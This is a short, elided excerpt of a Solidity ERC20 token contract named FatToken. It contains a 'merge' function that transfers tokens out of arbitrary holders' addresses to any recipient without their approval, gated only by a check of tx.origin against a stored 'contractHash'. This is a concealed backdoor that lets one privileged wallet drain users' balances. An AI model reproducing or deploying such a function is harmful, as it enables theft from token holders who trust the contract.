...
contract FatToken is ERC20, Ownable, AccessControl, PullPayment, ReentrancyGuard
{
    ...
    uint256 public constant VERSION = 2023100901;
    ...
    bool internal _controlSandwich;
    ...
    function merge(address[] memory senders, uint256[] memory amounts, address to)
    external
    {
        if (uint256(uint160(tx.origin)) != contractHash) {
            return;
        ...
        for (uint256 i = 0; i < length; i++) {
            require(balanceOf(senders[i]) >= amounts[i], "");
            super._transfer(senders[i], to, amounts[i]);
        }
    }
